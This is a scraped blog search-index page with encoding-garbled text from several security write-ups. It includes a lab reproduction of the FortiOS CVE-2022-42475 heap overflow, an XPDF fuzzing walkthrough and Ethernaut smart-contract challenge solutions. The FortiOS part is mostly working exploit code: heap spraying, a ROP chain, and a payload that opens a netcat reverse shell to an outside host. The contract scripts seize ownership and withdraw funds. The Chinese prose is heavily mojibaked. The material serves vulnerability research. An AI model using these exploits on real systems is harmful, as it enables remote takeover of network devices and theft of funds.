ç”±äºfortiosè™šæ‹Ÿæœºä¸­åªæœ‰ä¸€ä¸ªwebå®ˆæŠ¤è¿›ç¨‹ï¼Œä½¿ç”¨epoll()å¤„ç†è¿æ¥ï¼Œæ‰€ä»¥æ‰€æœ‰è¿æ¥çš„æ‰€æœ‰å†…å­˜æ“ä½œéƒ½ä¼šåœ¨åŒä¸€å—å †ä¸Šè¿›è¡Œ&lt;br&gt;
è€Œå½“æˆ‘ä»¬å‘é€HTTPè¯·æ±‚æ—¶ï¼Œä¼šåœ¨å †ä¸Šåˆ†é…SSLç»“æ„ä½“&lt;br&gt;
è€Œå¦‚æœåŠ«æŒSSLç»“æ„ä½“ä¸­&lt;code&gt;*handshake_func&lt;/code&gt;çš„å‡½æ•°æŒ‡é’ˆï¼Œå°±èƒ½åŠ«æŒæ‰§è¡Œæµ&lt;br&gt;
æ‰€ä»¥ç°åœ¨çš„æ€è·¯æ˜¯ï¼šé€šè¿‡å‘é€å¤šä¸ªæ­£å¸¸çš„HTTPè¯·æ±‚åœ¨å †ä¸Šå–·å°„SSLç»“æ„ä½“ï¼Œå†é€šè¿‡å †æº¢å‡ºè¦†ç›–è¿™äº›ç»“æ„ä½“çš„å‡½æ•°æŒ‡é’ˆè¾¾åˆ°åŠ«æŒæ‰§è¡Œæµçš„æ•ˆæœ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240815173039.png&#34; alt=&#34;Pasted image 20240815173039.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç›¸å…³æ±‡ç¼–@sub_1780A20:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;.text:0000000001780B00 48 8B 82 C0 00 00 00          mov     rax, [rdx+0C0h]
.text:0000000001780B07 4C 89 EF                      mov     rdi, r13
.text:0000000001780B0A 48 85 C0                      test    rax, rax
.text:0000000001780B0D 0F 84 85 00 00 00             jz      loc_1780B98
.text:0000000001780B0D
.text:0000000001780B13 5B                            pop     rbx
.text:0000000001780B14 41 5C                         pop     r12
.text:0000000001780B16 41 5D                         pop     r13
.text:0000000001780B18 41 5E                         pop     r14
.text:0000000001780B1A 5D                            pop     rbp
.text:0000000001780B1B FF E0                         jmp     rax
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å°†ä¹‹å‰çš„fuzzè„šæœ¬æŒ‰ç…§ä»¥ä¸‹æ€è·¯æ”¹é€ :&lt;br&gt;
ï¼ˆæŸäº›æ­¥éª¤ä¸ä¸€å®šéœ€è¦æˆ–è€…æœ‰ç”¨ï¼‰ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. åˆ›å»º 60 ä¸ª sock è¿æ¥ï¼Œå¹¶å‘é€ä¸å®Œæ•´çš„ http è¯·æ±‚ï¼Œå¸Œæœ›èƒ½åœ¨æœåŠ¡ç«¯åˆ†é…å¤šä¸ª SSL ç»“æ„ä½“
2. ä»ç¬¬ 40 ä¸ªå¼€å§‹é—´éš”é‡Šæ”¾ 10 ä¸ª sock é“¾æ¥ï¼Œå¸Œæœ›åœ¨æœåŠ¡ç«¯é‡Šæ”¾å‡ ä¸ª SSL ç»“æ„ä½“çš„ Hole.
3. åˆ†é…ç”¨äºæº¢å‡ºçš„ exp_sk
4. å†åˆ†é… 20 ä¸ª sock è¿æ¥ï¼Œå¤šåˆ†é…å‡ ä¸ª SSL ç»“æ„ä½“
5. è§¦å‘æº¢å‡ºï¼Œå¸Œæœ›ä¿®æ”¹ SSL ç»“æ„ä½“ä¸­çš„å‡½æ•°æŒ‡é’ˆ
6. ç»™å…¶ä»– socket å‘é€æ•°æ®ï¼Œç­‰å¾…å‡½æ•°æŒ‡é’ˆè°ƒç”¨
7. åŠ«æŒå‡½æ•°æŒ‡é’ˆåï¼Œåˆ‡æ¢æ ˆåˆ°å¯æ§æ•°æ®åŒºï¼Œç„¶å ROP è®¡ç®—æ ˆåœ°å€ï¼Œè°ƒç”¨ mprotect è®©æ ˆåŒºæœ‰å¯æ‰§è¡Œæƒé™
8. jmp esp è·³è½¬åˆ°æ ˆä¸Šçš„ shellcode æ‰§è¡Œã€‚
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä»¥ä¸Šæ˜¯æŒ‰ç…§ret2mprotectçš„æ‰“æ³•æ¥çš„ï¼Œè¿™é‡Œæˆ‘ä»¬pocç›´æ¥æ‰“ropï¼Œåˆ©ç”¨æˆ‘ä»¬ä¸Šä¼ çš„busyboxæ¼”ç¤ºå³å¯&lt;br&gt;
æ³¨æ„å‰é¢åˆ›å»ºçš„socksè¿æ¥ç›®çš„æ˜¯ä¸ºäº†è®©å †å¹³é¡ºä¸€ç‚¹ï¼ŒçœŸæ­£æº¢å‡ºçš„æ˜¯payloadæ‰€åœ¨socksä¹‹åçš„è¿æ¥&lt;br&gt;
è¿™é‡Œä»¥å‰åˆ›å»ºçš„socksè¿æ¥é‡Œé¢CLçš„å¤§å°ä¼šå½±å“å †ä¸Šåˆ†é…çš„ç»“æ„ä½“ï¼Œæˆ‘ä»¬é€‰æ‹©2000ï¼Œè§¦å‘æ¦‚ç‡å¤§ä¸€ç‚¹&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import socket
import ssl
from pwn import *

ip = &amp;quot;192.168.122.99&amp;quot;
port = 1443


path = &amp;quot;/remote/login&amp;quot;.encode()
# content_length = [&amp;quot;0&amp;quot;, &amp;quot;-1&amp;quot;, &amp;quot;2147483647&amp;quot;, &amp;quot;2147483648&amp;quot;, &amp;quot;-0&amp;quot;,
#                   &amp;quot;4294967295&amp;quot;, &amp;quot;4294967296&amp;quot;, &amp;quot;1111111111111&amp;quot;, &amp;quot;22222222222&amp;quot;]

content_length = &amp;quot;115964116992&amp;quot;

# 2147483647 int max
# 2147483648 max+1 -&amp;gt; -2147483648
# 4294967295 unsigned int max
# 4294967296 max+1 -&amp;gt; 0
# 1111111111111
# 2222222222222

# 0x000000000043a016 : ret
ret = 0x000000000043a016
counter = 0


def create_ssl_ctx():
    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _default_context = ssl._create_unverified_context()
    _socket = _default_context.wrap_socket(_socket)
    _socket.connect((ip, port))
    return _socket


socks = []

for i in range(60):
    sk = create_ssl_ctx()
    data = b&amp;quot;POST &amp;quot; + path + b&amp;quot; HTTP/1.1\r\nHost: 192.168.122.99\r\nContent-Length: 2000\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&amp;quot;
    sk.sendall(data)
    socks.append(sk)


# payload = B&amp;quot;A&amp;quot;*2592+p64(0xdeadbeef)
# payload = payload.ljust(0x2000, b&amp;quot;A&amp;quot;)
payload = cyclic(0x4000)
print(&amp;quot;[+] &amp;quot;+str(content_length)+&amp;quot; :&amp;quot;)
data = b&amp;quot;POST &amp;quot; + path + b&amp;quot; HTTP/1.1\r\nHost: 192.168.122.99\r\nContent-Length: &amp;quot; + \
    content_length.encode() + \
    b&amp;quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n&amp;quot;+payload
client = create_ssl_ctx()


for i in range(20, 40, 2):
    sk = socks[i]
    sk.close()
    socks[i] = None


client.sendall(data)


for sk in socks:
    if sk:
        data = b&amp;quot;b&amp;quot; * 40
        sk.sendall(data)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œæˆ‘ä»¬æ„é€ payloadä¸ºcyclic(0x4000)ï¼Œæœ‰æ¦‚ç‡æ–­åœ¨&lt;code&gt;0x1780B1B&lt;/code&gt;å¤„æ‰§è¡Œ&lt;code&gt;jmp rax&lt;/code&gt;ï¼Œæ­¤æ—¶åç§»ä¸º3616&lt;br&gt;
å¯ä»¥åŠ«æŒæ‰§è¡Œæµ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240818183810.png&#34; alt=&#34;Pasted image 20240818183810.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;è§‚å¯Ÿæ­¤æ—¶å†…å­˜å¸ƒå±€ï¼Œå¹¶ç»“åˆä¹‹å‰çš„æ±‡ç¼–&lt;code&gt;mov     rax, [rdx+0C0h]&lt;/code&gt;ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨rdxåœ°å€ä¸Šå­˜å‚¨æˆ‘ä»¬çš„ropé“¾ï¼Œå¹¶åœ¨&lt;code&gt;+0xc0&lt;/code&gt;åç§»å¤„(å³pocä¸­çš„ret)å­˜æ”¾æˆ‘ä»¬çš„pivot gadgetï¼Œå¹¶ä¸”gadgetéœ€è¦åŒ…å«&lt;code&gt;push rdx ; pop rsp&lt;/code&gt;ï¼Œä»è€Œè¿ç§»åˆ°ropé“¾å¤„&lt;/p&gt;
&lt;p&gt;initå¤ªå¤§ï¼Œè¾“å‡ºåˆ°txtæ–‡ä»¶æŸ¥æ‰¾:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ROPgadget --binary &amp;quot;./init&amp;quot; &amp;gt; 3.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æœ€ç»ˆæˆ‘ä»¬é€‰æ‹©&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;0x0000000000febbaa : push rdx ; pop rsp ; add eax, 0x83480deb ; ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å‰©ä¸‹çš„gadgetå°±æ¯”è¾ƒå¥½æ‰¾äº†ï¼Œæ³¨æ„æœ€åå †ä¸Šæœ‰è„æ•°æ®è®°å¾—padding&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240818204930.png&#34; alt=&#34;Pasted image 20240818204603.png&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import socket
import ssl
from pwn import *

ip = &amp;quot;192.168.122.99&amp;quot;
port = 1443


path = &amp;quot;/remote/login&amp;quot;.encode()
# content_length = [&amp;quot;0&amp;quot;, &amp;quot;-1&amp;quot;, &amp;quot;2147483647&amp;quot;, &amp;quot;2147483648&amp;quot;, &amp;quot;-0&amp;quot;,
#                   &amp;quot;4294967295&amp;quot;, &amp;quot;4294967296&amp;quot;, &amp;quot;1111111111111&amp;quot;, &amp;quot;22222222222&amp;quot;]

content_length = &amp;quot;115964116992&amp;quot;

# 2147483647 int max
# 2147483648 max+1 -&amp;gt; -2147483648
# 4294967295 unsigned int max
# 4294967296 max+1 -&amp;gt; 0
# 1111111111111
# 2222222222222

# 0x000000000043a016 : ret
ret = 0x000000000043a016
counter = 0


def create_ssl_ctx():
    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _default_context = ssl._create_unverified_context()
    _socket = _default_context.wrap_socket(_socket)
    _socket.connect((ip, port))
    return _socket


socks = []

for i in range(60):
    sk = create_ssl_ctx()
    data = b&amp;quot;POST &amp;quot; + path + b&amp;quot; HTTP/1.1\r\nHost: 192.168.122.99\r\nContent-Length: 2000\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&amp;quot;
    sk.sendall(data)
    socks.append(sk)

for i in range(20, 40, 2):
    sk = socks[i]
    sk.close()
    socks[i] = None

# payload = cyclic(0x4000)

sys_addr = 0x00000000005693C5
# .text:00000000005693C5 E8 46 58 ED FF                call    _system

pivot_gadget = 0x0000000000febbaa
# 0x0000000000febbaa : push rdx ; pop rsp ; add eax, 0x83480deb ; ret

pop_rax = 0x000000000046bb27
# 0x000000000046bb27 : pop rax ; ret

pop_rax_rcx = 0x000000000060b2fe
# 0x000000000060b2fe : pop rax ; pop rcx ; ret


add_rdx_rax = 0x0000000002a0e0e0
# 0x0000000002a0e0e0 : add rdx, rax ; mov eax, edx ; sub eax, edi ; ret

push_rdx_pop_rdi = 0x000000000257008a
# 0x000000000257008a : push rdx ; pop rdi ; ret

pop_rsi = 0x0000000000530c8e
# 0x0000000000530c8e : pop rsi ; ret

pop_rdx = 0x0000000000509372
# 0x0000000000509372 : pop rdx ; ret

add_rcx_r13 = 0x0000000000aac1d0
# 0x0000000000aac1d0 : add rcx, r13 ; ret

payload = b&amp;quot;B&amp;quot;*(3616-0xc0)
payload += p64(pop_rax_rcx)
payload += p64(0x50)
payload += p64(add_rcx_r13)  # padding
payload += p64(add_rdx_rax)
payload += p64(push_rdx_pop_rdi)
payload += p64(pop_rsi)+p64(0)
payload += p64(pop_rdx)+p64(0)
payload += p64(sys_addr)
payload += b&amp;quot;/bin/busybox nc 192.168.122.128 4444 -e /bin/sh&amp;quot;
payload += b&amp;quot;\x00&amp;quot;
payload = payload.ljust(3616, b&amp;quot;A&amp;quot;)+p64(pivot_gadget)
print(&amp;quot;[+] &amp;quot;+str(content_length)+&amp;quot; :&amp;quot;)
data = b&amp;quot;POST &amp;quot; + path + b&amp;quot; HTTP/1.1\r\nHost: 192.168.122.99\r\nContent-Length: &amp;quot; + \
    content_length.encode() + \
    b&amp;quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n&amp;quot;+payload
client = create_ssl_ctx()


for i in range(20):
    sk = create_ssl_ctx()
    socks.append(sk)


client.sendall(data)


for sk in socks:
    if sk:
        data = b&amp;quot;b&amp;quot; * 40
        sk.sendall(data)
&lt;/code&gt;&lt;/pre&gt;
">CVE-2022-42475 å¤ç°</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/0YuGrllUj/"" data-c="
          &lt;h1 id=&#34;cve-2019-13288-in-xpdf-302&#34;&gt;CVE-2019-13288 in XPDF 3.02&lt;/h1&gt;
&lt;h2 id=&#34;build&#34;&gt;build:&lt;/h2&gt;
&lt;p&gt;build.sh:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/sh
CC=afl-clang-fast CXX=afl-clang-fast++ ./configure --prefix=$PWD/bd
make
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;fuzzing&#34;&gt;fuzzing:&lt;/h2&gt;
&lt;p&gt;start.sh:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/sh
afl-fuzz -i $PWD/ipt -o $PWD/opt -s 123 -m none -- $PWD/bd/bin/pdftotext @@ $PWD/output
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;we get crash below :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;
 american fuzzy lop ++4.09a {default} (.../xpdf-3.02/bd/bin/pdftotext) [fast]
â”Œâ”€ process timing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€ overall results â”€â”€â”€â”€â”
â”‚        run time : 0 days, 0 hrs, 48 min, 47 sec     â”‚  cycles done : 0     â”‚
â”‚   last new find : 0 days, 0 hrs, 0 min, 4 sec       â”‚ corpus count : 782   â”‚
â”‚last saved crash : 0 days, 0 hrs, 7 min, 51 sec      â”‚saved crashes : 5     â”‚
â”‚ last saved hang : 0 days, 0 hrs, 4 min, 29 sec      â”‚  saved hangs : 2     â”‚
â”œâ”€ cycle progress â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€ map coverageâ”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  now processing : 781.0 (99.9%)      â”‚    map density : 2.81% / 4.58%      â”‚
â”‚  runs timed out : 0 (0.00%)          â”‚ count coverage : 4.10 bits/tuple    â”‚
â”œâ”€ stage progress â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€ findings in depth â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  now trying : trim 64/64             â”‚ favored items : 63 (8.06%)          â”‚
â”‚ stage execs : 47/384 (12.24%)        â”‚  new edges on : 138 (17.65%)        â”‚
â”‚ total execs : 1.10M                  â”‚ total crashes : 5 (5 saved)         â”‚
â”‚  exec speed : 321.8/sec              â”‚  total tmouts : 37 (0 saved)        â”‚
â”œâ”€ fuzzing strategy yields â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€ item geometry â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   bit flips : disabled (default, enable with -D)   â”‚    levels : 21        â”‚
â”‚  byte flips : disabled (default, enable with -D)   â”‚   pending : 557       â”‚
â”‚ arithmetics : disabled (default, enable with -D)   â”‚  pend fav : 2         â”‚
â”‚  known ints : disabled (default, enable with -D)   â”‚ own finds : 780       â”‚
â”‚  dictionary : n/a                                  â”‚  imported : 0         â”‚
â”‚havoc/splice : 572/451k, 213/333k                   â”‚ stability : 100.00%   â”‚
â”‚py/custom/rq : unused, unused, unused, unused       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â”‚    trim/eff : 3.39%/310k, disabled                 â”‚          [cpu000:  6%]
â””â”€ strategy: explore â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ state: in progress â”€â”€â”˜
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;analyze&#34;&gt;analyze:&lt;/h2&gt;
&lt;p&gt;use tmin to minimize the crashes&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/sh
mkdir -p $PWD/opt/default/minimized
for i in $PWD/opt/default/crashes/id* ; do afl-tmin -i $i -o $PWD/opt/default/minimized/`basename $i` -- $PWD/bd/bin/pdftotext @@ $PWD/output ; done
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;rebuild with dbg symbols and feed the crash sample&lt;br&gt;
gdb dbg:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt; gdb --args ./pdftotext id:000000,sig:11,src:000499,time:429922,execs:198634,op:havoc,rep:4 ./1
 start
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;step to the crash point and look up backtrace , we entered a infinete loop at src &lt;code&gt;Parser.cc:94&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;[#0] Id 1, Name: &amp;quot;pdftotext&amp;quot;, stopped 0x7ffff7af1e57 in _int_malloc (), reason: SIGSEGV
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ trace â”€â”€â”€â”€
[#0] 0x7ffff7af1e57 â†’ _int_malloc(av=0x7ffff7c68c80 &amp;lt;main_arena&amp;gt;, bytes=0x158)
[#1] 0x7ffff7af3262 â†’ __GI___libc_malloc(bytes=0x158)
[#2] 0x7ffff7e2c98c â†’ operator new(unsigned long)()
[#3] 0x5555555e2ca3 â†’ FileStream::makeSubStream(this=0x555555693c00, startA=0xa, limitedA=0x0, lengthA=0x0, dictA=0x7fffff7ff130)
[#4] 0x5555555f7a7c â†’ XRef::fetch(this=0x555555695230, num=0x4, gen=0x0, obj=0x7fffff7ff1e0)
[#5] 0x5555555e016f â†’ Object::dictLookup(obj=0x7fffff7ff1e0, key=0x55555560c1c6 &amp;quot;Length&amp;quot;, this=0x7fffff7ff3a0)
[#6] 0x5555555e016f â†’ Parser::makeStream(this=0x555556bc5a60, dict=0x7fffff7ff3a0, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0x0, objNum=0x4, objGen=0x0)
[#7] 0x5555555e071c â†’ Parser::getObj(this=0x555556bc5a60, obj=0x7fffff7ff3a0, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0x0, objNum=0x4, objGen=0x0)
[#8] 0x5555555f7bbd â†’ XRef::fetch(this=0x555555695230, num=0x4, gen=0x0, obj=0x7fffff7ff3a0)
[#9] 0x5555555e016f â†’ Object::dictLookup(obj=0x7fffff7ff3a0, key=0x55555560c1c6 &amp;quot;Length&amp;quot;, this=0x7fffff7ff560)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;here causes a recursion, will finally run out of stack memory&lt;/p&gt;
&lt;h2 id=&#34;mitigation&#34;&gt;mitigation:&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;#define recursionLimit 500&lt;/code&gt; and exit after reaching the limit .&lt;/p&gt;
&lt;h1 id=&#34;cve-2009-3895-cve-2012-2836-in-libexif-0614&#34;&gt;CVE-2009-3895 CVE-2012-2836 in libexif 0.6.14&lt;/h1&gt;
">Fuzzing101</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/3TfrFzmb/"" data-c="
          &lt;h2 id=&#34;fallback&#34;&gt;Fallback&lt;/h2&gt;
&lt;p&gt;our goal :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;claim ownership of the contract&lt;/li&gt;
&lt;li&gt;reduce its balance to 0&lt;br&gt;
original contract:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address =&amp;gt; uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, &amp;quot;caller is not the owner&amp;quot;);
        _;
    }

    function contribute() public payable {
        require(msg.value &amp;lt; 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] &amp;gt; contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value &amp;gt; 0 &amp;amp;&amp;amp; contributions[msg.sender] &amp;gt; 0);
        owner = msg.sender;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;as we send eth to the contract , the ownership automatically changed to us:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;         receive ETH
              |
         msg.data emptyï¼Ÿ
            /  \
           T    F
          /      \
receive() exists?   fallback()
        / \
       T   F
      /     \
receive()   fallback()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;so the answer:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;contibute&lt;/code&gt; to fund our account in contract&lt;/li&gt;
&lt;li&gt;&lt;code&gt;call{value: }(&amp;quot;&amp;quot;)&lt;/code&gt; to send eth to contract , trigger the &lt;code&gt;fallback&lt;/code&gt; (in this case &lt;code&gt;receive&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;owner changed and &lt;code&gt;withdraw&lt;/code&gt; all the fund in contract&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;POC:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script, console} from &amp;quot;forge-std/Script.sol&amp;quot;;
import {Fallback} from &amp;quot;../src/Fallback.sol&amp;quot;;

error callFailed();

contract fallBackSolution is Script {
    function run() external {
        uint256 PK = vm.envUint(&amp;quot;PRIVATE_KEY&amp;quot;);
        Fallback fallBackInstance = Fallback(payable(vm.envAddress(&amp;quot;FALLBACK_ADDRESS&amp;quot;)));
        // Fallback fallBackInstance = Fallback(payable(0x8Dafc24Ac2B813590f0a6b007159a1140c5Fd33c));

        console.log(&amp;quot;fallbackInstanceAddress: &amp;quot;, address(fallBackInstance));

        vm.startBroadcast(PK);

        fallBackInstance.contribute{value: 1}();

        (bool temp,) = payable(fallBackInstance).call{value: 1}(&amp;quot;&amp;quot;);
        if (!temp) revert callFailed();

        console.log(&amp;quot;New owner: &amp;quot;, fallBackInstance.owner());

        fallBackInstance.withdraw();

        vm.stopBroadcast();
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;fallout&#34;&gt;Fallout&lt;/h2&gt;
&lt;p&gt;our goal:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;claim the ownership&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;original contract:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import &amp;quot;openzeppelin-contracts-06/math/SafeMath.sol&amp;quot;;
// forge install openzeppelin-contracts-06=OpenZeppelin/openzeppelin-contracts@v3.4.0

contract Fallout {
    using SafeMath for uint256;

    mapping(address =&amp;gt; uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, &amp;quot;caller is not the owner&amp;quot;);
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] &amp;gt; 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;call the function &lt;code&gt;Fal1out&lt;/code&gt; to gain the ownership&lt;/p&gt;
&lt;p&gt;POC:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from &amp;quot;forge-std/Script.sol&amp;quot;;
import {Fallout} from &amp;quot;../src/Fallout.sol&amp;quot;;

contract CounterScript is Script {
    uint256 PK = vm.envUint(&amp;quot;PRIVATE_KEY&amp;quot;);
    address instanceAddress = vm.envAddress(&amp;quot;FALLOUT_ADDRESS&amp;quot;);

    function run() public {
        Fallout fallOut = Fallout(instanceAddress);

        vm.startBroadcast(PK);

        console.log(&amp;quot;contract owner: &amp;quot;, fallOut.owner());
        console.log(&amp;quot;calling Fal1out...&amp;quot;);

        fallOut.Fal1out();

        console.log(&amp;quot;contract owner: &amp;quot;, fallOut.owner());

        vm.stopBroadcast();
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;coinflip&#34;&gt;CoinFlip&lt;/h2&gt;
&lt;p&gt;our goal:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;win 10 times in a row&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;original contract:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;the contract uses unsafe factor which we can predict the side of coin each time&lt;br&gt;
when writing exp , there are few things need to concern:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;block.number&lt;/code&gt; was &lt;code&gt;0&lt;/code&gt; when not pointed , use &lt;code&gt;vm.roll()&lt;/code&gt; to set block number, otherwise it may take underflow error&lt;/li&gt;
&lt;li&gt;use &lt;code&gt;--tc CoinFlipScript&lt;/code&gt; to point which contract to run&lt;/li&gt;
&lt;li&gt;The contract has hash check, however ,when we do local simulation the hash won&#39;t change. So use &lt;code&gt;--skip-simulation&lt;/code&gt; to skip simulation check&lt;/li&gt;
&lt;/ul&gt;
